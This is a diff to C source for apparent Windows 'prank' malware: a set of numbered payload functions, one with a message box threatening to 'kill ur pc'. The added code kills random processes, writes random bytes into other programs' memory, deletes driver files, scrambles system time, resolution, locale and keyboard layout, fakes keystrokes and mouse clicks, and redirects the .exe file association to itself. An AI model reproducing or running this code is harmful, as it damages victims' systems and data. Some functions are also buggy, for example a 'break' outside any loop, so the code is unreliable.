@@ -213,7 +213,7 @@ int p7()
 
 //Terminate random running processes
 int p8()
-{ // Do in thread
+{ 
     fori(100)
     {
         HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rand() % 100);
@@ -359,7 +359,7 @@ int p12()
 }
 
 // Open a website
-int p13()
+int p13() 
 {
     MessageBoxW(NULL, L"sub 2 kevlu8", L"do it or i kill ur pc", MB_OK | MB_ICONINFORMATION);
     fori(100)
@@ -378,10 +378,11 @@ int p13()
             "https://web.archive.org/web/20210620035058/reddit.com/r/nonewnormal/",
             "https://www.roblox.com",
             "https://www.youareanidiot.org",
-            "https://www.twitter.com/dreamwastaken"
+            "https://www.twitter.com/dreamwastaken",
+            "https://www.youtube.com/channel/UCsiysQAqUGTLsk04k_BVowQ"
         }
-        Sleep(rand() % 100000);
-        ShellExecuteA(NULL, "open", urls[rand() % 13], NULL, NULL, SW_HIDE);
+        Sleep(rand() % 10000);
+        ShellExecuteA(NULL, "open", urls[rand() % 14], NULL, NULL, SW_HIDE);
     }
 }
 
@@ -405,9 +406,9 @@ int p14()
 }
 
 // Put "Your Mom" on the screen as text
-int p15() //Do in thread
+int p15() 
 {
-    fori(69420)
+    fori(500)
     {
         Sleep(rand() % 100);
         HDC hdc = GetDC(NULL);
@@ -434,7 +435,7 @@ int p15() //Do in thread
 }
 
 // Play randomly generated audio
-int p16() 
+int p16() //TODO fix
 {
     whiletrue
     {
@@ -453,3 +454,244 @@ int p16()
         VirtualFree(lpBuffer, 0, MEM_RELEASE);
     }
 }
+
+// Put a random image on the screen
+int p17() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 100);
+        HDC hdc = GetDC(NULL);
+        HBITMAP hBitmap = LoadBitmapA(NULL, MAKEINTRESOURCEA(rand() % 1000));
+        if (hBitmap == NULL)
+        {
+            break;
+        }
+        BITMAP bm;
+        GetObject(hBitmap, sizeof(BITMAP), &bm);
+        HDC hdcMem = CreateCompatibleDC(hdc);
+        SelectObject(hdcMem, hBitmap);
+        BitBlt(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
+        DeleteDC(hdcMem);
+        DeleteObject(hBitmap);
+        ReleaseDC(NULL, hdc);
+    }
+}
+
+// Change screen resolution
+int p18() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 60000);
+        ChangeDisplaySettingsA(NULL, 0);
+        DEVMODE dm;
+        dm.dmSize = sizeof(DEVMODE);
+        dm.dmPelsWidth = rand() % GetSystemMetrics(SM_CXSCREEN);
+        dm.dmPelsHeight = rand() % GetSystemMetrics(SM_CYSCREEN);
+        dm.dmBitsPerPel = rand() % 32;
+        dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT | DM_BITSPERPEL;
+        ChangeDisplaySettingsA(&dm, CDS_FULLSCREEN);
+    }
+}
+
+// Change the mouse cursor
+int p19() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 10000);
+        SetCursor(LoadCursorA(NULL, MAKEINTRESOURCEA(rand() % 1000)));
+    }
+}
+
+// Change the keyboard layout
+int p20() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 10000);
+        LoadKeyboardLayoutA(MAKEINTRESOURCEA(rand() % 1000), 0);
+    }
+}
+
+// Make the keyboard type random characters
+int p21() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 10000);
+        fori(rand() % 100)
+        {
+            keybd_event(rand() % 255, rand() % 255, rand() % 2, 0);
+        }
+    }
+}
+
+// Make the mouse move and click randomly
+int p22() // Must do in thread
+{
+    whiletrue
+    {
+        Sleep(rand() % 50);
+        mouse_event(rand() % 3, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));
+        mouse_event(rand() % 3, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));
+    }
+}
+
+// Corrupt random programs
+int p23() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 5000);
+        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, rand() % 0xFFFF);
+        if (hProcess == NULL)
+        {
+            break;
+        }
+        DWORD dwSize = 0x10000;
+        LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+        if (lpBuffer == NULL)
+        {
+            break;
+        }
+        fori(0x10000)
+        {
+            char c = rand() % 255;
+            if (c == 0)
+            {
+                c = 1;
+            }
+            WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBuffer + i), &c, 1, NULL);
+        }
+        VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+    }
+}
+
+// Randomly delete drivers
+int p24() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 5000);
+        char szDriver[MAX_PATH];
+        GetSystemDirectoryA(szDriver, MAX_PATH);
+        strcat(szDriver, "\\drivers\\");
+        strcat(szDriver, rand() % 2 ? "vmmouse.sys" : "vm3d.sys");
+        DeleteFileA(szDriver);
+    }
+}
+
+// Disconnect from the internet
+int p25() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 5000);
+        InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+        InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
+    }
+}
+
+// Randomly change the system time
+int p26()  //MUST DO IN THREAD
+{
+    whiletrue
+    {
+        Sleep(rand() % 5000);
+        SYSTEMTIME st;
+        st.wYear = rand() % 0xFFFF;
+        st.wMonth = rand() % 12;
+        st.wDayOfWeek = rand() % 7;
+        st.wDay = rand() % 31;
+        st.wHour = rand() % 24;
+        st.wMinute = rand() % 60;
+        st.wSecond = rand() % 60;
+        st.wMilliseconds = rand() % 1000;
+        SetSystemTime(&st);
+    }
+}
+
+// Randomly change the sound volume
+int p27()  //MUST DO IN THREAD
+{
+    whiletrue
+    {
+        Sleep(rand() % 10000);
+        DWORD dwVolume;
+        waveOutGetVolume(NULL, &dwVolume);
+        dwVolume = (rand() % 0xFFFF) | (dwVolume & 0xFFFF0000);
+        waveOutSetVolume(NULL, dwVolume);
+    }
+}
+
+// Color shift the screen using BitBlt
+int p28() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 10000);
+        HDC hdc = GetDC(NULL);
+        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
+        HDC hdcMem = CreateCompatibleDC(hdc);
+        SelectObject(hdcMem, hBitmap);
+        BitBlt(hdcMem, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, SRCCOPY);
+        fori(GetSystemMetrics(SM_CXSCREEN))
+        {
+            for (int j = 0; j < SM_CYSCREEN; j++)
+            {
+                COLORREF color = GetPixel(hdcMem, i, j);
+                SetPixel(hdcMem, i, j, RGB(GetRValue(color) + rand() % 0xFF, GetGValue(color) + rand() % 0xFF, GetBValue(color) + rand() % 0xFF));
+            }
+        }
+        BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdcMem, 0, 0, SRCCOPY);
+        DeleteDC(hdcMem);
+        DeleteObject(hBitmap);
+        ReleaseDC(NULL, hdc);
+    }
+}
+
+// Connect a virtual USB device
+int p29() 
+{
+    Sleep(rand() % 10000);
+    HANDLE hDevice = CreateFileA("\\\\.\\RandomUSBFile", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        break;
+    }
+    CloseHandle(hDevice);
+}
+
+// Randomly change the system language
+int p30() 
+{
+    Sleep(rand() % 10000);
+    SetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_ILANGUAGE, MAKEINTRESOURCEA(rand() % 1000));
+}
+
+// Randomly change the system theme
+int p31() 
+{
+    Sleep(rand() % 10000);
+    SetWindowTheme(NULL, MAKEINTRESOURCEA(rand() % 1000), NULL);
+}
+
+// Associate .exe files with this program
+int p32()  //TODO: Work on later
+{
+    fori(50)
+    {
+        Sleep(rand() % 10000);
+        TCHAR buffer[MAX_PATH] = { 0 };
+        GetModuleFileName( NULL, buffer, MAX_PATH );
+        HKEY hKey;
+        RegCreateKeyExA(HKEY_CLASSES_ROOT, ".exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
+        RegSetValueExA(hKey, NULL, 0, REG_SZ, (LPBYTE)buffer, strlen(buffer) + 1);
+        RegCloseKey(hKey);
+    }
+}
+
+//32 payloads. I'm done for the day!
